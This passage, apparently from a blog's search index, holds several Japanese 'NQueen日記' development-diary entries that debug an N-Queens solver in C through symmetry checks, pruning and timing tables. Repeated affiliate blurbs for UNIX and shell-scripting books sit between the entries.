そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-09T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-09-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-09-01-ani/","title":"NQueen日記 2022/09/09"},{"content":"9月5日 n13でsymmetryOps v2 とv1での違いを調査する。\n正確な回答 v1の方が数が多いのでv1だけsymmetryOpsを突破したものを抽出してみた。\nどうも、２辺、３辺が同じものについて違いが出てるようだ。\nsym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:4,r0:2,r1:5 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:4,r0:2,r1:6 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:4,r0:2,r1:7 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:5,r0:2,r1:5 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:5,r0:2,r1:6 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:6,r0:2,r1:5 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:6,r0:2,r1:7 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:7,r0:2,r1:6 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:7,r0:2,r1:7 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:2,r1:6 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:2,r1:8 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:6,r0:2,r1:8 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:8,r0:2,r1:6 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:8,r0:2,r1:8 sym:2:t0:2,t1:7,l0:2,l1:7,b0:2,b1:7,r0:2,r1:8 sym:2:t0:2,t1:7,l0:2,l1:7,b0:2,b1:8,r0:2,r1:8 sym:2:t0:3,t1:5,l0:3,l1:5,b0:3,b1:5,r0:3,r1:6 sym:2:t0:4,t1:2,l0:4,l1:2,b0:4,b1:2,r0:4,r1:6 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:2,r0:5,r1:3 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:2,r0:5,r1:9 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:3,r0:5,r1:3 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:9,r0:5,r1:9 sym:2:t0:5,t1:3,l0:5,l1:3,b0:5,b1:10,r0:5,r1:10 sym:2:t0:5,t1:3,l0:5,l1:3,b0:5,b1:3,r0:5,r1:10 sym:2:t0:5,t1:9,l0:5,l1:9,b0:5,b1:10,r0:5,r1:10 sym:2:t0:5,t1:9,l0:5,l1:9,b0:5,b1:9,r0:5,r1:10 まず、この中から最終行まで行ったものをピックアップしてみる\n以下の2つが最終行まで行っていた。\n３辺が同じパターンだ。symmetryOps v2はこれを弾いてしまっているが突破させてあげるのが正解。\n何故弾いているのか調査してみたいと思う。\nsym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:2,r1:6 12 11 10 9 8 7 6 5 4 3 2 1 0 ======================================= 0| 0000000000100 1| 0000000100000 2| 1000000000000 3| 0000000000000 4| 0000000000000 5| 0100000000000 6| 0000000000010 7| 0000000000000 8| 0000000000000 9| 0000000000000 10| 0000000000001 11| 0000010000000 12| 0010000000000 sym:2:t0:2,t1:7,l0:2,l1:7,b0:2,b1:7,r0:2,r1:8 12 11 10 9 8 7 6 5 4 3 2 1 0 ======================================= 0| 0000000000100 1| 0000010000000 2| 1000000000000 3| 0000000000000 4| 0000000000010 5| 0000000000000 6| 0000000000000 7| 0100000000000 8| 0000000000000 9| 0000000000000 10| 0000000000001 11| 0000000100000 12| 0010000000000 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-05T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-05-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-05-01-ani/","title":"NQueen日記 2022/09/05"},{"content":"9月2日 正しい結果と間違った結果のtop,left,bottom,rightの値を比較してみる。\n間違った結果の方が数が多いので、間違っている方だけsymmetryOpsを突破しているものを抽出して見た。\nsym:2:t0:2,t1:5,l0:6,l1:3,b0:3,b1:0,r0:3,r1:5 sym:2:t0:2,t1:6,l0:3,l1:1,b0:2,b1:7,r0:1,r1:3 sym:2:t0:2,t1:6,l0:3,l1:1,b0:2,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:3,l1:1,b0:3,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:4,l1:1,b0:2,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:4,l1:1,b0:4,b1:7,r0:1,r1:4 sym:2:t0:2,t1:6,l0:4,l1:1,b0:4,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:6,l1:1,b0:3,b1:0,r0:3,r1:5 sym:2:t0:3,t1:1,l0:5,l1:2,b0:3,b1:7,r0:1,r1:6 sym:2:t0:3,t1:6,l0:5,l1:1,b0:3,b1:7,r0:1,r1:4 試しにクイーンの配置を出力してみると\n7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 01000000 4| 00000001 5| 00000000 6| 10000000 7| 00010000 6で左端にクイーンが置かれているが、これだと時計回りに90度回転すると、1行目のクイーンの位置が右から2列目になる。 1行目のクイーンの配置は右から3列目なので最小にならない。 下部サイド枝刈りが機能していれば6,7の両端にクイーンは置けない。 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 01000000 4| 00000001 5| 00000000 6| x000000x 7| x001000x これは下部サイド枝刈りで枝刈りされているはずなのにうまく機能していない模様\n//【枝刈り】下部サイド枝刈り }else if(row==BOUND2) { //printf(\u0026#34;sidemask:row:%d BOUND2:%d SIDEMASK:%ld down:%ld\\n\u0026#34;,row,BOUND2,SIDEMASK,down); if((down\u0026amp;SIDEMASK)==0){ //printf(\u0026#34;eda_1\\n\u0026#34;); return; } if((down\u0026amp;SIDEMASK)!=SIDEMASK){ //printf(\u0026#34;eda_2\\n\u0026#34;); //printf(\u0026#34;before:%ld\u0026#34;,bitmap); bitmap\u0026amp;=SIDEMASK; //printf(\u0026#34;after:%ld\u0026#34;,bitmap); } 調べたところ、5(row==BOUND2)でクイーンを置かない場合に下部サイド枝刈りが効いていないようだ。\nクイーンを置かないで飛ばした場合も下部サイド枝刈りが効くようにする必要がある。\nrow\u0026gt;BOUND2の時はSIDEMASK(両端)にクイーンを置けないように修正した。\n}else if(row \u0026gt; BOUND2){ bitmap\u0026amp;=~SIDEMASK; } N12まで数はあったがN13以降逆に少なくなったので調査することにする。\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.00 11: 2680 341 0.01 12: 14200 1788 0.02 13: 73696 9235 0.10 14: 365564 45767 0.42 15: 2278976 285069 2.11 16: 14771576 1847308 12.39 17: 95809192 11978642 1:22.17 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-02T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-02-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-02-01-ani/","title":"NQueen日記 2022/09/02"},{"content":"8月30日 枝刈りを追加した。\n追加前よりなぜか遅くなった。\nsymmetryOpsのロジックを変えると速くなるだろうか。\n枝刈りを追加することによって回転対称チェック、ミラー判定を減らせるはずなのでsymmetryOpsを軽くできるはず。\n枝刈り追加前 15: 2279184 285095 2.43 16: 14772512 1847425 12.01 17: 95815104 11979381 1:12.26 枝刈り追加後 15: 2279184 285095 2.18 16: 14772512 1847425 12.55 17: 95815104 11979381 1:20.44 １行目角にクイーンがある場合はミラー判定だけ必要\nミラー判定についても、主対角線鏡像のみを判定すればよい\nif(row\u0026lt;BOUND1) { bitmap\u0026amp;=~2; // bm|=2; bm^=2; (bm\u0026amp;=~2と同等) } １行目角にクイーンが無い場合、クイーン位置より右位置の８対称位置にクイーンを置くことはできない\n//【枝刈り】上部サイド枝刈り if(row\u0026lt;BOUND1){ bitmap\u0026amp;=~SIDEMASK; //【枝刈り】下部サイド枝刈り }else if(row==BOUND2) { if((down\u0026amp;SIDEMASK)==0){ return; } if((down\u0026amp;SIDEMASK)!=SIDEMASK){ bitmap\u0026amp;=SIDEMASK; } //【枝刈り】最下段枝刈り }else if(row == size-1){ bitmap\u0026amp;=~LASTMASK; } 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-30T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-30-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-30-01-ani/","title":"NQueen日記 2022/08/30"},{"content":"8月29日 ミラー処理を入れてみた。\nミラー処理は1行目については右側半分だけクイーンを置くというもの\n奇数の場合は真ん中もやる。\nミラー処理を適用した結果適用前より少し速くなった。\nnの数が増えるほど効果が弱まっているのはきになる。\nまずは、引き続き枝刈り処理を追加していこうと思う。\nvoid NQueenR(int size,long mask,int aBoard[],int bBoard[],long bmask){ int bit; int colsize; //nが奇数の場合は真ん中もやる if(size%2==1){ colsize=size/2+1; }else{ colsize=size/2; } for(int col=0;col\u0026lt;colsize;col++){ bBoard[0]=bit=(1\u0026lt;\u0026lt;col); int x=0; if(bit==1){ x=0; }else if(bit==2){ x=1; }else if(bit==4){ x=2; }else if(bit==8){ x=3; }else if(bit==16){ x=4; }else if(bit==32){ x=5; }else if(bit==64){ x=6; }else if(bit==128){ x=7; }else if(bit==256){ x=8; }else if(bit==512){ x=9; }else if(bit==1024){ x=10; }else if(bit==2048){ x=11; }else if(bit==4096){ x=12; }else if(bit==8192){ x=13; }else if(bit==16384){ x=14; }else if(bit==32768){ x=15; }else if(bit==65536){ x=16; }else if(bit==131072){ x=17; } aBoard[0]=x; solve_nqueenr(size,mask,1,bit\u0026lt;\u0026lt;1,bit,bit\u0026gt;\u0026gt;1,aBoard,1\u0026lt;\u0026lt;(size-1+x),bit,1\u0026lt;\u0026lt;(x),bBoard,bmask); //NQueenR(size,mask,row+1,(left|bit)\u0026lt;\u0026lt;1, (down|bit),(right|bit)\u0026gt;\u0026gt;1,aBoard,lleft|1\u0026lt;\u0026lt;(size-1-row+x),ldown|bit,lright|1\u0026lt;\u0026lt;(row+x),bBoard,bmask); } } ミラー適用後 ６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.02 12: 14200 1788 0.06 13: 73712 9237 0.20 14: 365596 45771 0.63 15: 2279184 285095 2.52 16: 14772512 1847425 11.85 17: 95815104 11979381 1:10.41 ミラー適用前 ６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.03 12: 14200 1788 0.11 13: 73712 9237 0.32 14: 365596 45771 1.00 15: 2279184 285095 3.37 16: 14772512 1847425 15.38 17: 95815104 11979381 1:19.15 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 